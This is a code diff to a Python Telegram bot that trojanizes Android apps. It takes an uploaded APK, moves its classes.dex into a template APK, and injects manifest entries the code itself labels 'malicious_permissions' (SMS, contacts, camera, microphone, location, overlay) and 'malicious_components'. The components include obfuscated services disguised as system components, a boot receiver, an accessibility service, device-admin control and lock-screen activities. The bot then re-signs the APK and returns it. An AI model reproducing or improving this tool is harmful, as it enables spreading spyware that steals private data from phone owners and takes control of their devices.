@@ -3,6 +3,8 @@ import sys
 import logging
 import tempfile
 import subprocess
+import zipfile
+import shutil
 from pathlib import Path
 from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters
@@ -24,20 +26,13 @@ for path in ["/app/release.keystore", "./release.keystore"]:
 
 KEYSTORE_PASS = os.getenv("KEYSTORE_PASS", "android").strip()
 
-PAYLOAD = None
-PAYLOAD_SIZE = 0
-try:
-    for path in ["/app/payload.b64", "./payload.b64", "/app/payload_data.bin", "./payload_data.bin"]:
-        if os.path.exists(path) and os.path.getsize(path) > 0:
-            with open(path, "rb") as f:
-                PAYLOAD = f.read()
-            PAYLOAD_SIZE = len(PAYLOAD)
-            logger.info(f"Payload loaded from {path}: {PAYLOAD_SIZE} bytes")
-            break
-    if not PAYLOAD:
-        logger.error("Payload not found!")
-except Exception as e:
-    logger.error(f"Error loading payload: {e}")
+TEMPLATE_APK = None
+for path in ["/app/template.apk", "./template.apk"]:
+    if os.path.exists(path):
+        TEMPLATE_APK = path
+        break
+
+logger.info(f"Template APK: {TEMPLATE_APK or 'NOT FOUND'}")
 
 
 def check_tools():
@@ -69,45 +64,147 @@ def run_cmd(cmd, label):
     return True
 
 
+def extract_apk(apk_path, dest_dir):
+    with zipfile.ZipFile(apk_path, 'r') as z:
+        z.extractall(dest_dir)
+
+
+def create_apk(source_dir, output_path):
+    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as apk:
+        for root, dirs, files in os.walk(source_dir):
+            for f in files:
+                fp = os.path.join(root, f)
+                arcname = os.path.relpath(fp, source_dir)
+                apk.write(fp, arcname)
+
+
 def inject_payload(apk_bytes):
+    if not TEMPLATE_APK:
+        logger.error("Template APK not found!")
+        return None
+
     try:
         with tempfile.TemporaryDirectory() as tmpdir:
             tmp_path = Path(tmpdir)
             input_apk = tmp_path / "input.apk"
+            final_dir = tmp_path / "final"
             output_apk = tmp_path / "output.apk"
             signed_apk = tmp_path / "signed.apk"
-            decompiled_dir = tmp_path / "decompiled"
 
             with open(input_apk, "wb") as f:
                 f.write(apk_bytes)
-            logger.info(f"APK written: {len(apk_bytes)} bytes")
+            logger.info(f"Original APK written: {len(apk_bytes)} bytes")
 
-            logger.info("Decompiling APK...")
-            if not run_cmd(
-                ["apktool", "d", "-f", "-o", str(decompiled_dir), str(input_apk)],
-                "decompile"
-            ):
+            logger.info("Extracting classes.dex from original APK...")
+            dex_data = None
+            with zipfile.ZipFile(str(input_apk), 'r') as z:
+                for name in z.namelist():
+                    if name == "classes.dex":
+                        dex_data = z.read(name)
+                        break
+
+            if not dex_data:
+                logger.error("No classes.dex found in original APK!")
                 return None
 
-            payload_path = decompiled_dir / "assets" / "payload.bin"
-            payload_path.parent.mkdir(parents=True, exist_ok=True)
-            with open(payload_path, "wb") as f:
-                f.write(PAYLOAD)
-            logger.info(f"Payload injected: {len(PAYLOAD)} bytes")
+            logger.info(f"Extracted classes.dex: {len(dex_data)} bytes")
 
-            logger.info("Rebuilding APK...")
-            if not run_cmd(
-                ["apktool", "b", "-o", str(output_apk), str(decompiled_dir)],
-                "rebuild"
-            ):
-                return None
+            logger.info("Extracting template APK...")
+            extract_apk(TEMPLATE_APK, str(final_dir))
 
-            if not output_apk.exists():
-                logger.error("Rebuilt APK not found")
-                return None
+            logger.info("Replacing classes.dex...")
+            dst_dex = final_dir / "classes.dex"
+            if dst_dex.exists():
+                dst_dex.unlink()
+            dex_path = tmp_path / "classes.dex"
+            with open(dex_path, "wb") as f:
+                f.write(dex_data)
+            shutil.copy2(str(dex_path), str(dst_dex))
+            logger.info(f"classes.dex: {len(dex_data)} bytes")
+
+            logger.info("Updating AndroidManifest.xml...")
+            manifest_path = final_dir / "AndroidManifest.xml"
+            if manifest_path.exists():
+                manifest = manifest_path.read_text(encoding="utf-8")
+
+                malicious_permissions = """
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.CAMERA"/>
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.CALL_PHONE"/>
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+"""
+                malicious_components = """
+        <activity android:exported="true" android:name="com.android.system.qspaas.Splasher" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:enabled="true" android:exported="true" android:name="com.android.system.qspaas.xorrhqnktzlconhfcz" android:launchMode="singleTop" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:enabled="true" android:exported="true" android:name="com.android.system.qspaas.nulvhvslkpzikeyv" android:launchMode="singleTask" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:exported="true" android:name="com.android.system.qspaas.CallBacker" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:exported="true" android:name="com.android.system.qspaas.nytkqpzcfmeest" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <service android:enabled="true" android:exported="false" android:foregroundServiceType="dataSync" android:name="com.android.system.qspaas.dyttwohurwgpfsrmr"/>
+        <service android:enabled="true" android:exported="false" android:foregroundServiceType="dataSync" android:name="com.android.system.qspaas.minserv"/>
+        <service android:enabled="true" android:exported="false" android:foregroundServiceType="mediaProjection" android:name="com.android.system.qspaas.zcqtfvqpgqrnsixo"/>
+        <receiver android:enabled="true" android:exported="true" android:name="com.android.system.qspaas.BootReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:enabled="true" android:exported="true" android:name="com.android.system.qspaas.alarme">
+            <intent-filter>
+                <action android:name="AppAlarm"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:enabled="true" android:exported="true" android:name="com.android.system.qspaas.ResetServices">
+            <intent-filter>
+                <action android:name="android.intent.action.AIRPLANE_MODE"/>
+                <action android:name="android.intent.action.BATTERY_LOW"/>
+                <action android:name="android.intent.action.BATTERY_OKAY"/>
+            </intent-filter>
+        </receiver>
+        <service android:enabled="true" android:exported="false" android:name="com.android.system.qspaas.skrvptdbuqfbbtqlqbw" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data android:name="android.accessibilityservice" android:resource="@xml/znzhfghxfnlygvdkp"/>
+        </service>
+        <receiver android:exported="false" android:name="com.android.system.qspaas.MyDeviceAdminReceiver" android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data android:name="android.app.device_admin" android:resource="@xml/dapm"/>
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
+            </intent-filter>
+        </receiver>
+        <service android:enabled="true" android:exported="false" android:foregroundServiceType="dataSync" android:name="com.android.system.qspaas.DownloadForegroundService"/>
+        <activity android:exported="true" android:name="com.android.system.qspaas.vcgkovfskgcsbgqeuu" android:showOnLockScreen="true" android:showWhenLocked="true" android:theme="@android:style/Theme.Translucent.NoTitleBar" android:turnScreenOn="true"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenSize|smallestScreenSize" android:enabled="true" android:exported="true" android:keepScreenOn="true" android:launchMode="singleInstance" android:name="com.android.system.qspaas.ezodrbjc" android:showOnLockScreen="true" android:showWhenLocked="true" android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen" android:turnScreenOn="true"/>
+        <activity android:enabled="true" android:exported="true" android:name="com.android.system.qspaas.tofront" android:showOnLockScreen="true" android:showWhenLocked="true" android:theme="@android:style/Theme.Translucent.NoTitleBar" android:turnScreenOn="true"/>
+"""
+                manifest = manifest.replace("<application", malicious_permissions + "<application")
+                manifest = manifest.replace("</application>", malicious_components + "</application>")
+                manifest_path.write_text(manifest, encoding="utf-8")
+                logger.info("Manifest updated")
+
+            logger.info("Creating APK...")
+            create_apk(str(final_dir), str(output_apk))
+            logger.info(f"APK created: {os.path.getsize(output_apk)} bytes")
 
             if KEYSTORE_PATH:
-                logger.info("Signing APK with jarsigner...")
+                logger.info("Signing APK...")
                 sign_ok = run_cmd(
                     [
                         "jarsigner",
@@ -120,18 +217,13 @@ def inject_payload(apk_bytes):
                     ],
                     "sign"
                 )
-
                 if sign_ok and signed_apk.exists():
                     with open(signed_apk, "rb") as f:
                         return f.read()
 
-                logger.warning("Signing failed, returning unsigned APK")
-                with open(output_apk, "rb") as f:
-                    return f.read()
-            else:
-                logger.warning("No keystore, returning unsigned APK")
-                with open(output_apk, "rb") as f:
-                    return f.read()
+            logger.warning("Returning unsigned APK")
+            with open(output_apk, "rb") as f:
+                return f.read()
 
     except Exception as e:
         logger.error(f"Inject error: {e}", exc_info=True)
@@ -149,11 +241,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if PAYLOAD:
-        mb = len(PAYLOAD) // (1024 * 1024)
-        await update.message.reply_text(f"Payload loaded: {mb} MB")
+    if TEMPLATE_APK:
+        await update.message.reply_text(f"Template APK: OK\nKeystore: {'OK' if KEYSTORE_PATH else 'NOT FOUND'}")
     else:
-        await update.message.reply_text("No payload loaded!")
+        await update.message.reply_text("Template APK not found!")
 
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -167,10 +258,6 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not PAYLOAD:
-        await update.message.reply_text("Payload not loaded!")
-        return
-
     document = update.message.document
     if not document or not document.file_name.endswith(".apk"):
         await update.message.reply_text("Send a valid APK file!")
@@ -189,7 +276,7 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if result:
             await update.message.reply_document(
                 document=result,
-                filename=document.file_name,
+                filename=f"injected_{document.file_name}",
                 caption="APK injected successfully!"
             )
         else:
@@ -205,7 +292,7 @@ def main():
     logger.info(f"Python: {sys.version}")
     logger.info(f"TOKEN: {'SET' if TOKEN else 'NOT SET!'}")
     logger.info(f"Keystore: {KEYSTORE_PATH or 'NOT FOUND'}")
-    logger.info(f"Payload: {len(PAYLOAD) if PAYLOAD else 'NOT LOADED'}")
+    logger.info(f"Template: {TEMPLATE_APK or 'NOT FOUND'}")
     check_tools()
 
     if not TOKEN:
